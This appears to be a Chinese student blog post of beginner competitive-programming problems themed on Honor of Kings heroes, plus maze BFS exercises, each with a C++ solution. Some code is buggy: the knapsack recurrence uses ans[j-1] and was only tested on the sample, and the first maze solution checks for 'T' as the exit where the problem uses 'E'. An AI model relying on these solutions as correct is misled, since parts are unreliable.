<h1 id="16级题目"><a href="#16级题目" class="headerlink" title="16级题目"></a>16级题目</h1><h2 id="问题-A-星空梦想——鲁班"><a href="#问题-A-星空梦想——鲁班" class="headerlink" title="问题 A: 星空梦想——鲁班"></a>问题 A: 星空梦想——鲁班</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>鲁班七号是王者峡谷里的射手，站撸英雄。战场上的鲁班七号，机制强大的鲨嘴炮，立刻将挡在前路的任何物体轰飞。正如他所说的，“借你们的肉体试验下新发明的威力”。是的，这就是鲁班大师和他的天才机关造物鲁班七号。然而，鲁班最为致命的缺点是腿短，跑得慢，一个稍不留神，便会被刺客所击杀。</p>
<p>既然腿短，那么就来多多运动吧，跳跳台阶可还行？假设鲁班七号一次可以跳上1级台阶，但极限一次只能跳上2级台阶（腿短没办法，嘤嘤嘤）。鲁班七号现在从0级阶梯开始，最终跳上第n级的台阶，求总共有多少种跳法？</p>
<h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><p>多组测试用例。</p>
<p>第一行输入包含一个整数T（1&lt;=T&lt;=50），代表测试用例个数。</p>
<p>接下来T行，每行输入包含一个整数n（1&lt;=n&lt;=50），代表鲁班最终跳上了第n级台阶。</p>
<h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><p>每组测试用例对应一行输出，每行输出一个整数ans，代表鲁班最终跳上第n级台阶的跳法种数。</p>
<h3 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h3><div class="hljs"><pre><code class="hljs angelscript"><span class="hljs-number">3</span>
<span class="hljs-number">3</span>
<span class="hljs-number">4</span>
<span class="hljs-number">50</span></code></pre></div>

<h3 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h3><div class="hljs"><pre><code class="hljs angelscript"><span class="hljs-number">3</span>
<span class="hljs-number">5</span>
<span class="hljs-number">20365011074</span></code></pre></div>

<h3 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h3><p>注意结果超过int范围，请用long long类型存储ans</p>
<div class="hljs"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;
<span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> N=<span class="hljs-number">50</span>;
<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> f[N];
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
	f[<span class="hljs-number">0</span>]=<span class="hljs-number">1</span>,f[<span class="hljs-number">1</span>]=<span class="hljs-number">1</span>;
	<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">2</span>;i&lt;=<span class="hljs-number">50</span>;i++)
	&#123;
		f[i]=f[i<span class="hljs-number">-1</span>]+f[i<span class="hljs-number">-2</span>];
	&#125;
	<span class="hljs-keyword">int</span> n;
	<span class="hljs-built_in">cin</span>&gt;&gt;n;
	<span class="hljs-keyword">while</span>(n--)
	&#123;
		<span class="hljs-keyword">int</span> m;
		<span class="hljs-built_in">cin</span>&gt;&gt;m;
		<span class="hljs-built_in">cout</span>&lt;&lt;f[m]&lt;&lt;<span class="hljs-built_in">endl</span>;
	&#125;
	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
 &#125;</code></pre></div>



<h2 id="问题-B-午夜歌剧——元歌"><a href="#问题-B-午夜歌剧——元歌" class="headerlink" title="问题 B: 午夜歌剧——元歌"></a>问题 B: 午夜歌剧——元歌</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p>元歌是王者峡谷里的刺客。何谓至高机关之美呢？唯有以至高权力的手令太古奇迹重现人世，方能称得上啊。</p>
<p>是的，元歌擅长操控，所做傀儡能起到以假乱真的作用，今天元歌的傀儡变成你的初中数学老师，给你出个数学题：给你一个数字x，让你求出k7、k6、k5、k4、k3、k2、k1、k0（0&lt;=ki&lt;=9），使得以下等式1成立，最后根据等式2求出最终ans值。</p>
<p>等式1：</p>
<p><img src="https://s1.ax1x.com/2018/11/07/iTxDvF.png" srcset="/img/loading.gif" alt="img"></p>
<p>等式2：</p>
<p><img src="https://s1.ax1x.com/2018/11/07/iTxsu4.png" srcset="/img/loading.gif" alt="img"></p>
<h3 id="输入-1"><a href="#输入-1" class="headerlink" title="输入"></a>输入</h3><p>多组测试用例。</p>
<p>第一行输入包含一个整数T（1&lt;=T&lt;=1000），代表测试用例个数。</p>
<p>接下来T行，每一行包含一个整数x（1&lt;=x&lt;=1500000）。</p>
<h3 id="输出-1"><a href="#输出-1" class="headerlink" title="输出"></a>输出</h3><p>每组测试用例对应一行输出，每行输出一个整数ans，代表最终运算结果。</p>
<h3 id="样例输入-1"><a href="#样例输入-1" class="headerlink" title="样例输入"></a>样例输入</h3><div class="hljs"><pre><code class="hljs angelscript"><span class="hljs-number">3</span>
<span class="hljs-number">7</span>
<span class="hljs-number">143</span>
<span class="hljs-number">3223193224</span></code></pre></div>

<h3 id="样例输出-1"><a href="#样例输出-1" class="headerlink" title="样例输出"></a>样例输出</h3><div class="hljs"><pre><code class="hljs angelscript"><span class="hljs-number">10</span>
<span class="hljs-number">151</span>
<span class="hljs-number">163311433223</span></code></pre></div>

<h3 id="提示-1"><a href="#提示-1" class="headerlink" title="提示"></a>提示</h3><p>测试数据均大于等于1，不用特判0</p>
<p>感觉图片等式有点问题，一开始没理解什么意思，后来看了学长的提示。本质就是进制转换。</p>
<div class="hljs"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;
<span class="hljs-keyword">int</span> t,m;
<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">convert</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n)</span></span>
<span class="hljs-function"></span>&#123;
	<span class="hljs-keyword">int</span> c,r;
	r=n%<span class="hljs-number">7</span>;
	c=n/<span class="hljs-number">7</span>;
	<span class="hljs-keyword">if</span>(c&gt;<span class="hljs-number">0</span>)
	&#123;
		convert(c);
		<span class="hljs-built_in">cout</span>&lt;&lt;r;
	&#125;
	<span class="hljs-keyword">else</span>
	<span class="hljs-built_in">cout</span>&lt;&lt;n;
&#125; 
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
	<span class="hljs-built_in">cin</span>&gt;&gt;t;
	<span class="hljs-keyword">while</span>(t--)
	&#123;
		<span class="hljs-built_in">cin</span>&gt;&gt;m;
		convert(m);
		<span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-built_in">endl</span>;
	&#125;
	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
 &#125;</code></pre></div>

<h2 id="问题-C-圣诞恋歌——貂蝉"><a href="#问题-C-圣诞恋歌——貂蝉" class="headerlink" title="问题 C: 圣诞恋歌——貂蝉"></a>问题 C: 圣诞恋歌——貂蝉</h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><p>貂蝉是王者峡谷里的法师/刺客，貂蝉打法一定要注意配合技能与被动。半肉出装加上蛇皮走位，往往可以1打5，轻松拿下5杀。语花印被动描述为：技能命中会为敌人叠加花之印记，叠加满4层后印记触发被动，会给自身回复生命，同时会对周围敌人造成真实伤害并减速。<br>我们现在对貂蝉的技能及被动进行简化如下：每使用1次技能会攻击1次目标，每攻击3次目标，会自动额外攻击1次目标。<br>现在，貂蝉在游戏中使用了n次技能，请问总共会给目标带来多少次攻击。</p>
<h3 id="输入-2"><a href="#输入-2" class="headerlink" title="输入"></a>输入</h3><p>多组测试数据，第一行输入包含一个整数T，代表测试样例个数。<br>接下来T行，每行输入包含一个整数n（1&lt;=n&lt;=100），代表貂蝉使用了n次技能。</p>
<h3 id="输出-2"><a href="#输出-2" class="headerlink" title="输出"></a>输出</h3><p>每组测试用例对应一行输出，每行输出一个整数ans，代表貂蝉对目标进行了ans次攻击。</p>
<h3 id="样例输入-2"><a href="#样例输入-2" class="headerlink" title="样例输入"></a>样例输入</h3><div class="hljs"><pre><code class="hljs angelscript"><span class="hljs-number">6</span>
<span class="hljs-number">1</span>
<span class="hljs-number">2</span>
<span class="hljs-number">3</span>
<span class="hljs-number">45</span>
<span class="hljs-number">81</span></code></pre></div>

<h3 id="样例输出-2"><a href="#样例输出-2" class="headerlink" title="样例输出"></a>样例输出</h3><div class="hljs"><pre><code class="hljs angelscript"><span class="hljs-number">1</span>
<span class="hljs-number">2</span>
<span class="hljs-number">4</span>
<span class="hljs-number">57</span>
<span class="hljs-number">121</span></code></pre></div>

<h3 id="提示-2"><a href="#提示-2" class="headerlink" title="提示"></a>提示</h3><p>这题就是汽水瓶的改编。。。</p>
<div class="hljs"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
	<span class="hljs-keyword">int</span> n;
	<span class="hljs-built_in">cin</span>&gt;&gt;n; 
	<span class="hljs-keyword">while</span>(n--)
	&#123;
		<span class="hljs-keyword">int</span> m,sum;
		<span class="hljs-built_in">cin</span>&gt;&gt;m;
		sum=<span class="hljs-number">0</span>;
		<span class="hljs-keyword">while</span>(m&gt;<span class="hljs-number">3</span>)
		&#123;
			m=m<span class="hljs-number">-2</span>;
			sum=sum+<span class="hljs-number">3</span>;
		&#125;	
		<span class="hljs-keyword">if</span>(m==<span class="hljs-number">3</span>)
		sum+=<span class="hljs-number">4</span>;
		<span class="hljs-keyword">else</span>
		sum=m;
		<span class="hljs-built_in">cout</span>&lt;&lt;sum&lt;&lt;<span class="hljs-built_in">endl</span>; 
	&#125;
	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre></div>

<h2 id="问题-D-海之征途——孙策"><a href="#问题-D-海之征途——孙策" class="headerlink" title="问题 D: 海之征途——孙策"></a>问题 D: 海之征途——孙策</h2><h3 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h3><p>孙策是王者峡谷里的坦克/战士。大船靠岸，江郡欢呼着迎来了他们的新领袖，人称江东小霸王的年轻人。游戏中，孙策的技能长帆破浪，可以驾船冲锋，可将船撞向敌方单位或者阻挡物，并造成一定的伤害。</p>
<p>现在，有一群好奇的江郡小朋友想跟着孙策一起出海航行，但孙策的船承载不了所有小朋友，所以孙策决定，尽可能带更多的小朋友出海，现在请你帮孙策谋一个策略，使得更多的小朋友有机会出海航行。已知的条件是孙策船的最大载重m，以及n个小朋友的体重。</p>
<h3 id="输入-3"><a href="#输入-3" class="headerlink" title="输入"></a>输入</h3><p>多组测试用例。<br>第一行输入包含一个整数T（1&lt;=T&lt;=1000），代表测试用例个数。</p>
<p>每组测试用例第一行有两个整数m和n。（0&lt;=m&lt;=1000， 0&lt;=n&lt;=1000），分别代表船的载重重量和小朋友的个数，接下来一行为n个小朋友的体重。</p>
<h3 id="输出-3"><a href="#输出-3" class="headerlink" title="输出"></a>输出</h3><p>每组测试用例对应一行输出，每行输出一个整数ans，代表最多能有ans个小朋友跟着一起出海。</p>
<h3 id="样例输入-3"><a href="#样例输入-3" class="headerlink" title="样例输入"></a>样例输入</h3><div class="hljs"><pre><code class="hljs basic"><span class="hljs-number">2</span>
<span class="hljs-symbol">10 </span><span class="hljs-number">4</span>
<span class="hljs-symbol">3 </span><span class="hljs-number">5</span> <span class="hljs-number">2</span> <span class="hljs-number">4</span>
<span class="hljs-symbol">20 </span><span class="hljs-number">9</span>
<span class="hljs-symbol">3 </span><span class="hljs-number">5</span> <span class="hljs-number">2</span> <span class="hljs-number">4</span> <span class="hljs-number">6</span> <span class="hljs-number">1</span> <span class="hljs-number">8</span> <span class="hljs-number">5</span> <span class="hljs-number">9</span></code></pre></div>

<h3 id="样例输出-3"><a href="#样例输出-3" class="headerlink" title="样例输出"></a>样例输出</h3><div class="hljs"><pre><code class="hljs angelscript"><span class="hljs-number">3</span>
<span class="hljs-number">6</span></code></pre></div>

<h3 id="提示-3"><a href="#提示-3" class="headerlink" title="提示"></a>提示</h3><p>就是简单的装在问题</p>
<div class="hljs"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;
<span class="hljs-keyword">int</span> T,m,n;
<span class="hljs-keyword">int</span> w[<span class="hljs-number">1005</span>];
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
	<span class="hljs-built_in">cin</span>&gt;&gt;T;
	<span class="hljs-keyword">while</span>(T--)
	&#123;
		<span class="hljs-keyword">int</span> ans=<span class="hljs-number">0</span>;
		<span class="hljs-built_in">cin</span>&gt;&gt;m&gt;&gt;n;
		<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)
		&#123;
			<span class="hljs-built_in">cin</span>&gt;&gt;w[i];
		&#125;
		sort(w,w+n);
		<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)
		&#123;
			<span class="hljs-keyword">if</span>(m&gt;=w[i])
			&#123;
				ans++;
				m-=w[i];
			&#125;
			<span class="hljs-keyword">else</span>
			<span class="hljs-keyword">break</span>; 
		&#125; 
		<span class="hljs-built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="hljs-built_in">endl</span>;
	&#125;
	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre></div>

<h2 id="问题-E-极冰防御——盾山"><a href="#问题-E-极冰防御——盾山" class="headerlink" title="问题 E: 极冰防御——盾山"></a>问题 E: 极冰防御——盾山</h2><h3 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h3><p>盾山是王者峡谷里的辅助，一夫当关、万夫莫开，一个好的辅助往往可以给团队带来极大帮助。</p>
<p>盾山的游戏中的一个技能为不动如山：手握一块由石头组成的巨盾，张开巨盾砸向地面，将敌人推开，并持续一段时间。</p>
<p>假设盾山最多只能承受C重量的盾牌，而现在有N个小石头，每个石头i的重量为Wi，防御值为Pi。那么，呆萌的盾山想知道，他从N个小石头中挑选M个（M&lt;=N）组成他可承受盾牌，最大的防御值是多少？</p>
<h3 id="输入-4"><a href="#输入-4" class="headerlink" title="输入"></a>输入</h3><p>多组测试用例。<br>第一行输入包含一个整数T（1&lt;=T&lt;=10），代表测试用例个数。</p>
<p>接下来有T组测试用例。每组测试用例第一行为盾山承受盾牌的最大重量C(C&lt;10000)和小石头的个数N(N&lt;1000)。接下来的N行分别为小石头的重量Wi(1&lt;=Wi&lt;=100)和防御值Pi(1&lt;=Pi&lt;=3000000)。</p>
<h3 id="输出-4"><a href="#输出-4" class="headerlink" title="输出"></a>输出</h3><p>每组测试用例对应一行输出，每行输出一个整数ans，代表可承受盾牌的最大防御值。</p>
<h3 id="样例输入-4"><a href="#样例输入-4" class="headerlink" title="样例输入"></a>样例输入</h3><div class="hljs"><pre><code class="hljs basic"><span class="hljs-number">1</span>
<span class="hljs-symbol">10 </span><span class="hljs-number">5</span>
<span class="hljs-symbol">2 </span><span class="hljs-number">6</span>
<span class="hljs-symbol">2 </span><span class="hljs-number">3</span>
<span class="hljs-symbol">6 </span><span class="hljs-number">5</span>
<span class="hljs-symbol">5 </span><span class="hljs-number">4</span>
<span class="hljs-symbol">4 </span><span class="hljs-number">6</span></code></pre></div>

<h3 id="样例输出-4"><a href="#样例输出-4" class="headerlink" title="样例输出"></a>样例输出</h3><div class="hljs"><pre><code class="hljs angelscript"><span class="hljs-number">15</span></code></pre></div>

<h3 id="提示-4"><a href="#提示-4" class="headerlink" title="提示"></a>提示</h3><p>01背包问题，不知道下面的解能不能过</p>
<div class="hljs"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;
<span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> N=<span class="hljs-number">1e5</span>+<span class="hljs-number">5</span>;
<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> ans[N];
<span class="hljs-keyword">int</span> w[N],v[N];
<span class="hljs-keyword">int</span> T;
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
	<span class="hljs-built_in">cin</span>&gt;&gt;T;
	<span class="hljs-keyword">while</span>(T--)
	&#123;
		<span class="hljs-keyword">int</span> C,N;
		<span class="hljs-built_in">memset</span>(ans,<span class="hljs-number">0</span>,<span class="hljs-keyword">sizeof</span>(ans));
		<span class="hljs-built_in">cin</span>&gt;&gt;C&gt;&gt;N;
		<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;N;i++)
		&#123;
			<span class="hljs-built_in">cin</span>&gt;&gt;w[i]&gt;&gt;v[i];
		&#125;
		<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;N;i++)
		&#123;
			<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=C;j&gt;=w[i];j--)
			ans[j]=<span class="hljs-built_in">max</span>(ans[j<span class="hljs-number">-1</span>],ans[j-w[i]]+v[i]);
		&#125;
<span class="hljs-comment">//		for(int i=0;i&lt;=C;i++)</span>
<span class="hljs-comment">//		cout&lt;&lt;ans[i]&lt;&lt;endl;</span>
		<span class="hljs-built_in">cout</span>&lt;&lt;ans[C]&lt;&lt;<span class="hljs-built_in">endl</span>;
	&#125; 
	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre></div>

<p>ps:以上代码没有提交测试环境，只是过了给出的测试样例。</p>
<h1 id="dfs大合集"><a href="#dfs大合集" class="headerlink" title="dfs大合集"></a>dfs大合集</h1><h2 id="迷宫问题"><a href="#迷宫问题" class="headerlink" title="迷宫问题"></a>迷宫问题</h2><h3 id="题目描述-5"><a href="#题目描述-5" class="headerlink" title="题目描述"></a>题目描述</h3><p>小明置身于一个迷宫，请你帮小明找出从起点到终点的最短路程。<br>小明只能向上下左右四个方向移动。</p>
<p>输入</p>
<p>输入包含多组测试数据。输入的第一行是一个整数T，表示有T组测试数据。<br>每组输入的第一行是两个整数N和M（1&lt;=N,M&lt;=100）。<br>接下来N行，每行输入M个字符，每个字符表示迷宫中的一个小方格。<br>字符的含义如下：<br>‘S’：起点<br>‘E’：终点<br>‘-’：空地，可以通过<br>‘#’：障碍，无法通过<br>输入数据保证有且仅有一个起点和终点。</p>
<p>输出</p>
<p>对于每组输入，输出从起点到终点的最短路程，如果不存在从起点到终点的路，则输出-1。</p>
<h3 id="样例输入-5"><a href="#样例输入-5" class="headerlink" title="样例输入"></a>样例输入</h3><div class="hljs"><pre><code class="hljs asciidoc">1
5 5
s-###
-----
##---
E#---
---##</code></pre></div>

<h3 id="样例输出-5"><a href="#样例输出-5" class="headerlink" title="样例输出"></a>样例输出</h3><div class="hljs"><pre><code class="hljs angelscript"><span class="hljs-number">9</span></code></pre></div>

<div class="hljs"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;cstring&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;string&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;queue&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;algorithm&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;
<span class="hljs-keyword">int</span> de[<span class="hljs-number">100</span>][<span class="hljs-number">100</span>];<span class="hljs-comment">//计步数组  记录走到这个位置所需的步数 不能走到的位置标记为-1 </span>
<span class="hljs-keyword">char</span> <span class="hljs-built_in">map</span>[<span class="hljs-number">100</span>][<span class="hljs-number">100</span>];  <span class="hljs-comment">//用于存放迷宫地图 </span>
<span class="hljs-keyword">typedef</span> pair&lt;<span class="hljs-keyword">int</span>,<span class="hljs-keyword">int</span>&gt; P;  <span class="hljs-comment">//坐标</span>
<span class="hljs-keyword">int</span> to[<span class="hljs-number">2</span>][<span class="hljs-number">4</span>]=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">-1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">-1</span>&#125;;  <span class="hljs-comment">//在当前坐标下能走的四个方向</span>
<span class="hljs-keyword">int</span> sx,ex,sy,ey;  <span class="hljs-comment">//(sx,sy)为起点坐标  （ex,ey）为终点坐标</span>
<span class="hljs-keyword">int</span> x,y,nx,ny; <span class="hljs-comment">//(x,y)为函数中当前位置坐标   （nx,ny)为接下来能到达的坐标 </span>
<span class="hljs-keyword">int</span> r,l;  <span class="hljs-comment">//r为行数 l为列数 </span>
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">bfs</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
	<span class="hljs-built_in">memset</span>(de,<span class="hljs-number">-1</span>,<span class="hljs-keyword">sizeof</span>(de));
	<span class="hljs-built_in">queue</span>&lt;P&gt; qu;
	qu.push(P(sx,sy));   <span class="hljs-comment">//将起点坐标放入队头 </span>
	de[sx][sy]=<span class="hljs-number">0</span>;
	<span class="hljs-keyword">while</span>(!qu.empty()) 
	&#123;
		P p=qu.front();   <span class="hljs-comment">//取出队头坐标 </span>
		qu.pop() ;<span class="hljs-comment">//删除对头及走过的坐标 </span>
		x=p.first,y=p.second; 
		<span class="hljs-keyword">if</span>(x==ex&amp;&amp;y==ey) <span class="hljs-keyword">break</span>; <span class="hljs-comment">//到达终点 跳出循环		</span>
	 	<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">4</span>;i++)
		&#123;
			nx=x+to[<span class="hljs-number">0</span>][i];<span class="hljs-comment">//开始向四个方向移动 </span>
			ny=y+to[<span class="hljs-number">1</span>][i];			
				<span class="hljs-keyword">if</span>(nx&gt;=<span class="hljs-number">0</span>&amp;&amp;nx&lt;r&amp;&amp;ny&gt;=<span class="hljs-number">0</span>&amp;&amp;ny&lt;l&amp;&amp;<span class="hljs-built_in">map</span>[nx][ny]!=<span class="hljs-string">'#'</span>&amp;&amp;de[nx][ny]==<span class="hljs-number">-1</span>)
	 			<span class="hljs-comment">//判断是否越界 以及是否能走  排除走过的路 </span>
	 			&#123;
			     	qu.push(P(nx,ny));      <span class="hljs-comment">//将能走的坐标放入队列 之后依次删除 </span>
			    	de[nx][ny]=de[x][y]+<span class="hljs-number">1</span>;  <span class="hljs-comment">//步数加一 </span>
				&#125; 				  
			&#125;
	&#125;
	<span class="hljs-keyword">if</span>(de[ex][ey]==<span class="hljs-number">-1</span>)  <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;  <span class="hljs-comment">//终点的记步数组为-1 及不能到达终点 </span>
	<span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> de[ex][ey]; 
&#125; 
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
	<span class="hljs-keyword">int</span> n,i,j;
	<span class="hljs-keyword">while</span>(<span class="hljs-built_in">cin</span>&gt;&gt;n)&#123;
		<span class="hljs-keyword">while</span>(n--)&#123;
			<span class="hljs-built_in">cin</span>&gt;&gt;r&gt;&gt;l;
			<span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;r;i++)&#123;
				<span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>;j&lt;l;j++)&#123; 
				<span class="hljs-built_in">cin</span>&gt;&gt;<span class="hljs-built_in">map</span>[i][j];
				<span class="hljs-keyword">if</span>(<span class="hljs-built_in">map</span>[i][j]==<span class="hljs-string">'S'</span>) <span class="hljs-comment">//记录起点坐标 </span>
				 &#123;
					sx=i,sy=j;
				 &#125; 
				 <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-built_in">map</span>[i][j]==<span class="hljs-string">'T'</span>)  <span class="hljs-comment">//记录终点坐标 </span>
				 &#123;
				 	ex=i,ey=j;
				 &#125;
				&#125;
			&#125;
			<span class="hljs-built_in">cout</span>&lt;&lt;bfs()&lt;&lt;<span class="hljs-built_in">endl</span>;
		&#125;
	&#125;
	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre></div>

<h2 id="acwing迷宫问题"><a href="#acwing迷宫问题" class="headerlink" title="acwing迷宫问题"></a>acwing迷宫问题</h2><div class="hljs"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;
<span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> N=<span class="hljs-number">105</span>;
<span class="hljs-keyword">int</span> mp[N][N];
<span class="hljs-keyword">int</span> dis[N][N];
<span class="hljs-keyword">typedef</span> pair&lt;<span class="hljs-keyword">int</span>,<span class="hljs-keyword">int</span>&gt; P;
<span class="hljs-keyword">int</span> n,m;
<span class="hljs-keyword">int</span> to[<span class="hljs-number">2</span>][<span class="hljs-number">4</span>]=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">-1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">-1</span>&#125;;
<span class="hljs-keyword">int</span> x,y,nx,ny;
<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
	<span class="hljs-built_in">memset</span>(dis,<span class="hljs-number">-1</span>,<span class="hljs-keyword">sizeof</span>(dis));
	<span class="hljs-built_in">queue</span>&lt;P&gt; qu;
	qu.push(P(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>));
	dis[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]=<span class="hljs-number">0</span>;
	<span class="hljs-keyword">while</span>(!qu.empty())
	&#123;
		P p=qu.front();
		qu.pop();
		x=p.first,y=p.second;
		<span class="hljs-keyword">if</span>(x==n<span class="hljs-number">-1</span>&amp;&amp;y==m<span class="hljs-number">-1</span>) <span class="hljs-keyword">break</span>;
		<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">4</span>;i++)
		&#123;
			nx=x+to[<span class="hljs-number">0</span>][i],ny=y+to[<span class="hljs-number">1</span>][i];
			<span class="hljs-keyword">if</span>(nx&gt;=<span class="hljs-number">0</span>&amp;&amp;nx&lt;n&amp;&amp;ny&gt;=<span class="hljs-number">0</span>&amp;&amp;ny&lt;m&amp;&amp;dis[nx][ny]==<span class="hljs-number">-1</span>&amp;&amp;mp[nx][ny]==<span class="hljs-number">0</span>)
			&#123;
				qu.push(P(nx,ny));
				dis[nx][ny]=dis[x][y]+<span class="hljs-number">1</span>;
			&#125;
		 &#125; 
		
	&#125;
	<span class="hljs-keyword">if</span>(dis[n<span class="hljs-number">-1</span>][m<span class="hljs-number">-1</span>]!=<span class="hljs-number">-1</span>)
	<span class="hljs-built_in">cout</span>&lt;&lt;dis[n<span class="hljs-number">-1</span>][m<span class="hljs-number">-1</span>];
	<span class="hljs-keyword">return</span>; 
&#125;
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
	<span class="hljs-built_in">cin</span>&gt;&gt;n&gt;&gt;m;
	<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)
	<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=<span class="hljs-number">0</span>;j&lt;m;j++)
	<span class="hljs-built_in">cin</span>&gt;&gt;mp[i][j];
	dfs();
	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre></div>

